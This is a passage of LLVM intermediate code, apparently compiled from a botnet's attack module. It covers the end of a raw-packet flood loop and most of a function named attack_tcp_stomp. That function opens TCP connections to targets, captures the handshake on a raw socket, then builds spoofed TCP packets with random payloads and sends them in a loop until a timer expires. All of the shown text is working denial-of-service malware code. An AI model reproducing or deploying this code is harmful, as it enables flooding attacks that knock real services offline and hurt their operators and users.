  %163 = load i32, i32* %6, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %6, align 4
  %165 = icmp slt i32 %164, %50
  br i1 %165, label %.lr.ph136.split, label %.preheader.loopexit149

; <label>:166:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %51, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %166
  br i1 %113, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %207
  %storemerge127135.us = phi i32 [ %226, %207 ], [ 0, %.lr.ph.split.us.preheader ]
  %167 = sext i32 %storemerge127135.us to i64
  %168 = getelementptr inbounds i8*, i8** %9, i64 %167
  %169 = load i8*, i8** %168, align 8
  %170 = bitcast i8* %169 to %struct.iphdr*
  %171 = getelementptr inbounds i8, i8* %169, i64 20
  %172 = getelementptr inbounds i8, i8* %169, i64 40
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %167, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %167, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %169, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %169, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %115, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %169, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %186, %183
  br i1 %117, label %190, label %192

; <label>:190:                                    ; preds = %189
  %191 = bitcast i8* %171 to i16*
  store i16 0, i16* %191, align 4
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br i1 %119, label %193, label %196

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %169, i64 22
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %193, %192
  br i1 %120, label %197, label %200

; <label>:197:                                    ; preds = %196
  %198 = getelementptr inbounds i8, i8* %169, i64 24
  %199 = bitcast i8* %198 to i32*
  store i32 0, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %197, %196
  br i1 %121, label %201, label %204

; <label>:201:                                    ; preds = %200
  %202 = getelementptr inbounds i8, i8* %169, i64 28
  %203 = bitcast i8* %202 to i32*
  store i32 0, i32* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %200
  br i1 %122, label %207, label %205

; <label>:205:                                    ; preds = %204
  call void @rand_alphastr(i8* nonnull %172, i32 %36)
  %206 = getelementptr inbounds i8, i8* %172, i64 %.pre140
  store i8 0, i8* %206, align 1
  %.pre139 = load i32, i32* %6, align 4
  br label %207

; <label>:207:                                    ; preds = %205, %204
  %208 = phi i32 [ %.pre139, %205 ], [ %storemerge127135.us, %204 ]
  %209 = getelementptr inbounds i8, i8* %169, i64 10
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %169 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %169, i64 36
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext %124) #11
  %216 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %170, i8* nonnull %171, i16 zeroext %215, i32 %125)
  store i16 %216, i16* %214, align 4
  %217 = getelementptr inbounds i8, i8* %169, i64 22
  %218 = bitcast i8* %217 to i16*
  %219 = load i16, i16* %218, align 2
  %220 = sext i32 %208 to i64
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %220, i32 0, i32 1
  store i16 %219, i16* %221, align 2
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %220, i32 0
  %223 = bitcast %struct.sockaddr_in* %222 to %struct.sockaddr*
  %224 = call i64 @sendto(i32 %44, i8* nonnull %169, i64 %.pre141, i32 16384, %struct.sockaddr* %223, i32 16) #10
  %225 = load i32, i32* %6, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %6, align 4
  %227 = icmp slt i32 %226, %50
  br i1 %227, label %.lr.ph.split.us, label %._crit_edge.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %storemerge127135 = phi i32 [ %285, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %storemerge127135 to i64
  %229 = getelementptr inbounds i8*, i8** %9, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds i8, i8* %230, i64 40
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %228, i32 2
  %235 = load i8, i8* %234, align 4
  %236 = icmp ult i8 %235, 32
  br i1 %236, label %237, label %244

; <label>:237:                                    ; preds = %.lr.ph.split
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %228, i32 1
  %239 = load i32, i32* %238, align 4
  %240 = call i32 @ntohl(i32 %239) #11
  %241 = call i32 @htonl(i32 %240) #11
  %242 = getelementptr inbounds i8, i8* %230, i64 16
  %243 = bitcast i8* %242 to i32*
  store i32 %241, i32* %243, align 4
  br label %244

; <label>:244:                                    ; preds = %.lr.ph.split, %237
  br i1 %115, label %245, label %248

; <label>:245:                                    ; preds = %244
  %246 = getelementptr inbounds i8, i8* %230, i64 4
  %247 = bitcast i8* %246 to i16*
  store i16 0, i16* %247, align 4
  br label %248

; <label>:248:                                    ; preds = %245, %244
  br i1 %117, label %249, label %251

; <label>:249:                                    ; preds = %248
  %250 = bitcast i8* %232 to i16*
  store i16 0, i16* %250, align 4
  br label %251

; <label>:251:                                    ; preds = %249, %248
  br i1 %119, label %252, label %255

; <label>:252:                                    ; preds = %251
  %253 = getelementptr inbounds i8, i8* %230, i64 22
  %254 = bitcast i8* %253 to i16*
  store i16 0, i16* %254, align 2
  br label %255

; <label>:255:                                    ; preds = %252, %251
  br i1 %120, label %256, label %259

; <label>:256:                                    ; preds = %255
  %257 = getelementptr inbounds i8, i8* %230, i64 24
  %258 = bitcast i8* %257 to i32*
  store i32 0, i32* %258, align 4
  br label %259

; <label>:259:                                    ; preds = %256, %255
  br i1 %121, label %260, label %263

; <label>:260:                                    ; preds = %259
  %261 = getelementptr inbounds i8, i8* %230, i64 28
  %262 = bitcast i8* %261 to i32*
  store i32 0, i32* %262, align 4
  br label %263

; <label>:263:                                    ; preds = %260, %259
  br i1 %122, label %266, label %264

; <label>:264:                                    ; preds = %263
  call void @rand_alphastr(i8* %233, i32 %36)
  %265 = getelementptr inbounds i8, i8* %233, i64 %.pre140
  store i8 0, i8* %265, align 1
  %.pre = load i32, i32* %6, align 4
  br label %266

; <label>:266:                                    ; preds = %263, %264
  %267 = phi i32 [ %storemerge127135, %263 ], [ %.pre, %264 ]
  %268 = getelementptr inbounds i8, i8* %230, i64 10
  %269 = bitcast i8* %268 to i16*
  store i16 0, i16* %269, align 2
  %270 = bitcast i8* %230 to i16*
  %271 = call zeroext i16 @checksum_generic(i16* %270, i32 20)
  store i16 %271, i16* %269, align 2
  %272 = getelementptr inbounds i8, i8* %230, i64 36
  %273 = bitcast i8* %272 to i16*
  store i16 0, i16* %273, align 4
  %274 = call zeroext i16 @htons(i16 zeroext %124) #11
  %275 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %274, i32 %125)
  store i16 %275, i16* %273, align 4
  %276 = getelementptr inbounds i8, i8* %230, i64 22
  %277 = bitcast i8* %276 to i16*
  %278 = load i16, i16* %277, align 2
  %279 = sext i32 %267 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %279, i32 0, i32 1
  store i16 %278, i16* %280, align 2
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %279, i32 0
  %282 = bitcast %struct.sockaddr_in* %281 to %struct.sockaddr*
  %283 = call i64 @sendto(i32 %44, i8* %230, i64 %.pre141, i32 16384, %struct.sockaddr* %282, i32 16) #10
  %284 = load i32, i32* %6, align 4
  %285 = add nsw i32 %284, 1
  store i32 %285, i32* %6, align 4
  %286 = icmp slt i32 %285, %50
  br i1 %286, label %.lr.ph.split, label %._crit_edge.loopexit148

._crit_edge.loopexit:                             ; preds = %207
  br label %._crit_edge

._crit_edge.loopexit148:                          ; preds = %266
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit148, %._crit_edge.loopexit, %166
  %287 = call i64 @time(i64* null) #10
  %288 = icmp sgt i64 %287, %126
  br i1 %288, label %.loopexit.loopexit, label %166

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %111
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca [256 x i8], align 16
  store i32 0, i32* %6, align 4
  %11 = zext i8 %1 to i64
  %12 = tail call noalias i8* @calloc(i64 %11, i64 16) #10
  %13 = bitcast i8* %12 to %struct.attack_stomp_data*
  %14 = tail call noalias i8* @calloc(i64 %11, i64 8) #10
  %15 = bitcast i8* %14 to i8**
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %21 = trunc i32 %20 to i8
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %25 = trunc i32 %24 to i16
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 1)
  %29 = trunc i32 %28 to i16
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 1)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %37 = trunc i32 %36 to i16
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 768)
  %39 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %40 = trunc i32 %39 to i8
  %41 = tail call i64 @time(i64* null) #10
  %42 = zext i32 %0 to i64
  %43 = add i64 %41, %42
  %44 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %.loopexit, label %46

; <label>:46:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %47 = bitcast i32* %6 to i8*
  %48 = call i32 @setsockopt(i32 %44, i32 0, i32 3, i8* nonnull %47, i32 4) #10
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %86, label %.preheader160

.preheader160:                                    ; preds = %46
  store i32 0, i32* %6, align 4
  %50 = zext i8 %1 to i32
  %51 = icmp eq i8 %1, 0
  br i1 %51, label %.preheader160..preheader_crit_edge, label %.preheader158.lr.ph

.preheader160..preheader_crit_edge:               ; preds = %.preheader160
  %.pre183 = sext i32 %38 to i64
  %.pre184 = add nsw i64 %.pre183, 40
  br label %.preheader

.preheader158.lr.ph:                              ; preds = %.preheader160
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %54 = and i32 %24, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  %57 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %59 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2, i32 0
  %61 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 20
  %62 = bitcast i8* %61 to i16*
  %63 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 32
  %64 = bitcast i8* %63 to i16*
  %65 = sext i32 %38 to i64
  %66 = add nsw i64 %65, 40
  %67 = trunc i64 %66 to i16
  %68 = icmp eq i8 %23, 0
  %69 = shl i16 %27, 13
  %70 = and i16 %69, 8192
  %71 = shl i16 %29, 12
  %72 = and i16 %71, 4096
  %73 = shl i16 %31, 11
  %74 = and i16 %73, 2048
  %75 = shl i16 %33, 10
  %76 = and i16 %75, 1024
  %77 = shl i16 %35, 9
  %78 = and i16 %77, 512
  %79 = shl i16 %37, 8
  %80 = and i16 %79, 256
  %81 = or i16 %72, %70
  %82 = or i16 %81, %74
  %83 = or i16 %82, %76
  %.masked = or i16 %83, %78
  %84 = or i16 %.masked, %80
  %85 = or i16 %84, 128
  br label %.preheader158

; <label>:86:                                     ; preds = %46
  %87 = call i32 @close(i32 %44) #10
  br label %.loopexit

.preheader158:                                    ; preds = %.preheader158.lr.ph, %.loopexit159
  %.0169 = phi %struct.tcphdr* [ undef, %.preheader158.lr.ph ], [ %.1, %.loopexit159 ]
  %88 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %.loopexit159, label %.lr.ph168

.lr.ph168:                                        ; preds = %.preheader158
  br i1 %55, label %.lr.ph168.split.us.preheader, label %.lr.ph168.split.preheader

.lr.ph168.split.preheader:                        ; preds = %.lr.ph168
  br label %.lr.ph168.split

.lr.ph168.split.us.preheader:                     ; preds = %.lr.ph168
  br label %.lr.ph168.split.us

.lr.ph168.split.us:                               ; preds = %.lr.ph168.split.us.preheader, %.backedge.us
  %90 = phi i32 [ %137, %.backedge.us ], [ %88, %.lr.ph168.split.us.preheader ]
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %90, i32 3, i32 0) #10
  %92 = or i32 %91, 2048
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %90, i32 4, i32 %92) #10
  store i16 2, i16* %52, align 4
  %94 = load i32, i32* %6, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %95, i32 2
  %97 = load i8, i8* %96, align 4
  %98 = icmp ult i8 %97, 32
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %95, i32 1
  %100 = load i32, i32* %99, align 4
  br i1 %98, label %101, label %104

; <label>:101:                                    ; preds = %.lr.ph168.split.us
  %102 = call i32 @ntohl(i32 %100) #11
  %103 = call i32 @htonl(i32 %102) #11
  br label %104

; <label>:104:                                    ; preds = %101, %.lr.ph168.split.us
  %.sink.us = phi i32 [ %103, %101 ], [ %100, %.lr.ph168.split.us ]
  store i32 %.sink.us, i32* %53, align 4
  store i16 0, i16* %56, align 2
  %105 = call i32 @connect(i32 %90, %struct.sockaddr* nonnull %57, i32 16) #10
  %106 = call i64 @time(i64* null) #10
  br label %107

; <label>:107:                                    ; preds = %131, %104
  store i32 16, i32* %9, align 4
  %108 = call i64 @recvfrom(i32 %44, i8* nonnull %58, i64 256, i32 16384, %struct.sockaddr* nonnull %59, i32* nonnull %9) #10
  %109 = trunc i64 %108 to i32
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %.loopexit.loopexit215, label %111

; <label>:111:                                    ; preds = %107
  %112 = load i32, i32* %60, align 4
  %113 = load i32, i32* %53, align 4
  %114 = icmp eq i32 %112, %113
  br i1 %114, label %115, label %131

; <label>:115:                                    ; preds = %111
  %sext146.us = shl i64 %108, 32
  %116 = ashr exact i64 %sext146.us, 32
  %117 = icmp ugt i64 %116, 40
  br i1 %117, label %118, label %131

; <label>:118:                                    ; preds = %115
  %119 = load i16, i16* %62, align 4
  %120 = load i16, i16* %56, align 2
  %121 = icmp eq i16 %119, %120
  br i1 %121, label %122, label %131

; <label>:122:                                    ; preds = %118
  %123 = load i16, i16* %64, align 16
  %124 = and i16 %123, 4608
  %125 = icmp eq i16 %124, 4608
  br i1 %125, label %.us-lcssa.us.loopexit, label %126

; <label>:126:                                    ; preds = %122
  %127 = and i16 %123, 1280
  %128 = icmp eq i16 %127, 0
  br i1 %128, label %131, label %129

; <label>:129:                                    ; preds = %126
  %130 = call i32 @close(i32 %90) #10
  br label %.backedge.us

; <label>:131:                                    ; preds = %126, %118, %115, %111
  %132 = call i64 @time(i64* null) #10
  %133 = sub nsw i64 %132, %106
  %134 = icmp sgt i64 %133, 10
  br i1 %134, label %135, label %107

; <label>:135:                                    ; preds = %131
  %136 = call i32 @close(i32 %90) #10
  br label %.backedge.us

.backedge.us:                                     ; preds = %135, %129
  %137 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %138 = icmp eq i32 %137, -1
  br i1 %138, label %.loopexit159.loopexit, label %.lr.ph168.split.us

.preheader.loopexit:                              ; preds = %.loopexit159
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader160..preheader_crit_edge
  %.pre-phi185 = phi i64 [ %.pre184, %.preheader160..preheader_crit_edge ], [ %66, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre183, %.preheader160..preheader_crit_edge ], [ %65, %.preheader.loopexit ]
  %139 = and i32 %18, 65535
  %140 = icmp eq i32 %139, 65535
  %141 = icmp eq i8 %40, 0
  %142 = add nsw i64 %.pre-phi, 20
  %143 = trunc i64 %142 to i16
  %144 = trunc i64 %142 to i32
  %sext = shl i64 %43, 32
  %145 = ashr exact i64 %sext, 32
  br label %252

.lr.ph168.split:                                  ; preds = %.lr.ph168.split.preheader, %.backedge
  %146 = phi i32 [ %241, %.backedge ], [ %88, %.lr.ph168.split.preheader ]
  %147 = call i32 (i32, i32, ...) @fcntl(i32 %146, i32 3, i32 0) #10
  %148 = or i32 %147, 2048
  %149 = call i32 (i32, i32, ...) @fcntl(i32 %146, i32 4, i32 %148) #10
  store i16 2, i16* %52, align 4
  %150 = load i32, i32* %6, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %151, i32 2
  %153 = load i8, i8* %152, align 4
  %154 = icmp ult i8 %153, 32
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %151, i32 1
  %156 = load i32, i32* %155, align 4
  br i1 %154, label %157, label %160

; <label>:157:                                    ; preds = %.lr.ph168.split
  %158 = call i32 @ntohl(i32 %156) #11
  %159 = call i32 @htonl(i32 %158) #11
  br label %160

; <label>:160:                                    ; preds = %.lr.ph168.split, %157
  %.sink = phi i32 [ %159, %157 ], [ %156, %.lr.ph168.split ]
  store i32 %.sink, i32* %53, align 4
  %161 = call zeroext i16 @htons(i16 zeroext %25) #11
  store i16 %161, i16* %56, align 2
  %162 = call i32 @connect(i32 %146, %struct.sockaddr* nonnull %57, i32 16) #10
  %163 = call i64 @time(i64* null) #10
  br label %164

; <label>:164:                                    ; preds = %243, %160
  store i32 16, i32* %9, align 4
  %165 = call i64 @recvfrom(i32 %44, i8* nonnull %58, i64 256, i32 16384, %struct.sockaddr* nonnull %59, i32* nonnull %9) #10
  %166 = trunc i64 %165 to i32
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %.loopexit.loopexit216, label %168

; <label>:168:                                    ; preds = %164
  %169 = load i32, i32* %60, align 4
  %170 = load i32, i32* %53, align 4
  %171 = icmp eq i32 %169, %170
  br i1 %171, label %172, label %243

; <label>:172:                                    ; preds = %168
  %sext146 = shl i64 %165, 32
  %173 = ashr exact i64 %sext146, 32
  %174 = icmp ugt i64 %173, 40
  br i1 %174, label %175, label %243

; <label>:175:                                    ; preds = %172
  %176 = load i16, i16* %62, align 4
  %177 = load i16, i16* %56, align 2
  %178 = icmp eq i16 %176, %177
  br i1 %178, label %179, label %243

; <label>:179:                                    ; preds = %175
  %180 = load i16, i16* %64, align 16
  %181 = and i16 %180, 4608
  %182 = icmp eq i16 %181, 4608
  br i1 %182, label %.us-lcssa.us.loopexit217, label %236

.us-lcssa.us.loopexit:                            ; preds = %122
  br label %.us-lcssa.us

.us-lcssa.us.loopexit217:                         ; preds = %179
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit217, %.us-lcssa.us.loopexit
  %183 = phi i16 [ %119, %.us-lcssa.us.loopexit ], [ %176, %.us-lcssa.us.loopexit217 ]
  %184 = phi i32 [ %112, %.us-lcssa.us.loopexit ], [ %169, %.us-lcssa.us.loopexit217 ]
  %185 = load i32, i32* %6, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %186, i32 0
  store i32 %184, i32* %187, align 4
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 2
  %189 = load i32, i32* %188, align 4
  %190 = call i32 @ntohl(i32 %189) #11
  %191 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %186, i32 1
  store i32 %190, i32* %191, align 4
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 3
  %193 = load i32, i32* %192, align 4
  %194 = call i32 @ntohl(i32 %193) #11
  %195 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %186, i32 2
  store i32 %194, i32* %195, align 4
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 1
  %197 = load i16, i16* %196, align 2
  %198 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %186, i32 3
  store i16 %197, i16* %198, align 4
  %199 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %186, i32 4
  store i16 %183, i16* %199, align 2
  %200 = call noalias i8* @malloc(i64 %66) #10
  %201 = getelementptr inbounds i8*, i8** %15, i64 %186
  store i8* %200, i8** %201, align 8
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = bitcast i8* %202 to %struct.tcphdr*
  %204 = getelementptr inbounds i8, i8* %200, i64 40
  store i8 69, i8* %200, align 4
  %205 = getelementptr inbounds i8, i8* %200, i64 1
  store i8 %17, i8* %205, align 1
  %206 = call zeroext i16 @htons(i16 zeroext %67) #11
  %207 = getelementptr inbounds i8, i8* %200, i64 2
  %208 = bitcast i8* %207 to i16*
  store i16 %206, i16* %208, align 2
  %209 = call zeroext i16 @htons(i16 zeroext %19) #11
  %210 = getelementptr inbounds i8, i8* %200, i64 4
  %211 = bitcast i8* %210 to i16*
  store i16 %209, i16* %211, align 4
  %212 = getelementptr inbounds i8, i8* %200, i64 8
  store i8 %21, i8* %212, align 4
  br i1 %68, label %217, label %213

; <label>:213:                                    ; preds = %.us-lcssa.us
  %214 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %215 = getelementptr inbounds i8, i8* %200, i64 6
  %216 = bitcast i8* %215 to i16*
  store i16 %214, i16* %216, align 2
  br label %217

; <label>:217:                                    ; preds = %.us-lcssa.us, %213
  %218 = getelementptr inbounds i8, i8* %200, i64 9
  store i8 6, i8* %218, align 1
  %219 = load i32, i32* @LOCAL_ADDR, align 4
  %220 = getelementptr inbounds i8, i8* %200, i64 12
  %221 = bitcast i8* %220 to i32*
  store i32 %219, i32* %221, align 4
  %222 = getelementptr inbounds i8, i8* %200, i64 16
  %223 = bitcast i8* %222 to i32*
  store i32 %184, i32* %223, align 4
  %224 = bitcast i8* %202 to i16*
  store i16 %197, i16* %224, align 4
  %225 = getelementptr inbounds i8, i8* %200, i64 22
  %226 = bitcast i8* %225 to i16*
  store i16 %183, i16* %226, align 2
  %227 = getelementptr inbounds i8, i8* %200, i64 24
  %228 = bitcast i8* %227 to i32*
  store i32 %194, i32* %228, align 4
  %229 = getelementptr inbounds i8, i8* %200, i64 28
  %230 = bitcast i8* %229 to i32*
  store i32 %190, i32* %230, align 4
  %231 = getelementptr inbounds i8, i8* %200, i64 32
  %232 = bitcast i8* %231 to i16*
  %233 = getelementptr inbounds i8, i8* %200, i64 34
  %234 = bitcast i8* %233 to i16*
  store i16 0, i16* %234, align 2
  store i16 %85, i16* %232, align 4
  call void @rand_alphastr(i8* %204, i32 %38)
  %235 = getelementptr inbounds i8, i8* %204, i64 %65
  store i8 0, i8* %235, align 1
  br label %.loopexit159

; <label>:236:                                    ; preds = %179
  %237 = and i16 %180, 1280
  %238 = icmp eq i16 %237, 0
  br i1 %238, label %243, label %239

; <label>:239:                                    ; preds = %236
  %240 = call i32 @close(i32 %146) #10
  br label %.backedge

.backedge:                                        ; preds = %239, %247
  %241 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %242 = icmp eq i32 %241, -1
  br i1 %242, label %.loopexit159.loopexit218, label %.lr.ph168.split

; <label>:243:                                    ; preds = %236, %175, %172, %168
  %244 = call i64 @time(i64* null) #10
  %245 = sub nsw i64 %244, %163
  %246 = icmp sgt i64 %245, 10
  br i1 %246, label %247, label %164

; <label>:247:                                    ; preds = %243
  %248 = call i32 @close(i32 %146) #10
  br label %.backedge

.loopexit159.loopexit:                            ; preds = %.backedge.us
  br label %.loopexit159

.loopexit159.loopexit218:                         ; preds = %.backedge
  br label %.loopexit159

.loopexit159:                                     ; preds = %.loopexit159.loopexit218, %.loopexit159.loopexit, %.preheader158, %217
  %.1 = phi %struct.tcphdr* [ %203, %217 ], [ %.0169, %.preheader158 ], [ %.0169, %.loopexit159.loopexit ], [ %.0169, %.loopexit159.loopexit218 ]
  %249 = load i32, i32* %6, align 4
  %250 = add nsw i32 %249, 1
  store i32 %250, i32* %6, align 4
  %251 = icmp slt i32 %250, %50
  br i1 %251, label %.preheader158, label %.preheader.loopexit

; <label>:252:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %51, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %252
  br i1 %140, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %263
  %storemerge145167.us = phi i32 [ %297, %263 ], [ 0, %.lr.ph.split.us.preheader ]
  %253 = sext i32 %storemerge145167.us to i64
  %254 = getelementptr inbounds i8*, i8** %15, i64 %253
  %255 = load i8*, i8** %254, align 8
  %256 = bitcast i8* %255 to %struct.iphdr*
  %257 = getelementptr inbounds i8, i8* %255, i64 20
  %258 = getelementptr inbounds i8, i8* %255, i64 40
  %259 = getelementptr inbounds i8, i8* %255, i64 4
  %260 = bitcast i8* %259 to i16*
  store i16 0, i16* %260, align 4
  br i1 %141, label %263, label %261

; <label>:261:                                    ; preds = %.lr.ph.split.us
  call void @rand_alphastr(i8* %258, i32 %38)
  %262 = getelementptr inbounds i8, i8* %258, i64 %.pre-phi
  store i8 0, i8* %262, align 1
  %.pre182 = load i32, i32* %6, align 4
  br label %263

; <label>:263:                                    ; preds = %261, %.lr.ph.split.us
  %264 = phi i32 [ %.pre182, %261 ], [ %storemerge145167.us, %.lr.ph.split.us ]
  %265 = getelementptr inbounds i8, i8* %255, i64 10
  %266 = bitcast i8* %265 to i16*
  store i16 0, i16* %266, align 2
  %267 = bitcast i8* %255 to i16*
  %268 = call zeroext i16 @checksum_generic(i16* %267, i32 20)
  store i16 %268, i16* %266, align 2
  %269 = sext i32 %264 to i64
  %270 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %269, i32 1
  %271 = load i32, i32* %270, align 4
  %272 = add i32 %271, 1
  store i32 %272, i32* %270, align 4
  %273 = trunc i32 %271 to i16
